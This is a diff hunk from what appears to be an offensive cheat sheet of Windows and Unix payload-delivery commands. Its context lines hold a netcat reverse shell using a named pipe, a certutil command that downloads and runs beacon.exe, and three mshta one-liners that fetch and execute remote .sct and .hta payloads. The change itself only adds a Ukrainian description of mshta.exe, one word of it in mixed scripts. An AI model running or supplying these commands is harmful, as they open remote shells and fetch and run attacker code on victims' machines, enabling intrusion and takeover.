@@ -45,7 +45,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## WINDOWS CERTUTIL: certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-## WINDOWS MSHTA:
+## WINDOWS MSHTA: 
+mshta.exe xост застосунку HTML Microsoft (R) – це виконуваний файл у Windows, розроблений корпорацією Майкрософт і постачається разом із операційною системою. 
+Цей елемент є об’єктом запуску програми Microsoft HTML – програми, яка відповідає за роботу додатків HTML (.hta-файлів) та запуску скриптів у Windows.
 1) mshta.exe vbscript:Close(Execute("GetObject(""script:http://127.0.0.1:4444/payload.sct"")"))
 2) mshta.exe http://127.0.0.1:4444/payload.hta
 3) mshta.exe \\127.0.0.1\folder\payload.hta
